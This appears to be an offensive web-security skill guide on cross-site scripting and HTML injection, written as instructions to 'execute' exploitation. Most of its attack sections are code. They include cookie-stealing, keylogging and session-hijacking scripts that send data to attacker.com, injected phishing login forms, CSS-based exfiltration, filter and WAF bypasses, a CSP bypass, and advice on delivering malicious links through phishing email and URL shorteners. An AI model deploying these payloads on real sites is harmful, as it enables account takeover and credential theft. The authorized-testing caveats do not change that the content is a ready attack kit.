{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="evil.com">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="evil.com">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| HTML entities | `&#60;h1&#62;` = `<h1>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts
- WAFs may block common payloads
- Some applications escape output properly

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser
- Test in multiple browsers
- Check for stored vs reflected

### Severity Assessment
- Lower severity than XSS (no script execution)
- Higher impact when combined with phishing
- Consider defacement/reputation damage
- Evaluate credential theft potential

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |


---

## [XSS + HTML Injection (zebbern)] Additional Techniques

# Cross-Site Scripting and HTML Injection Testing

## Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.

## Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

## Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations

## Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> â†’ Check execution
2. Insert <img src=x onerror=alert(1)> â†’ Check event handler
3. Insert "><script>alert(1)</script> â†’ Test attribute escape
4. Insert javascript:alert(1) â†’ Test href/src attributes
5. Check URL hash handling â†’ DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
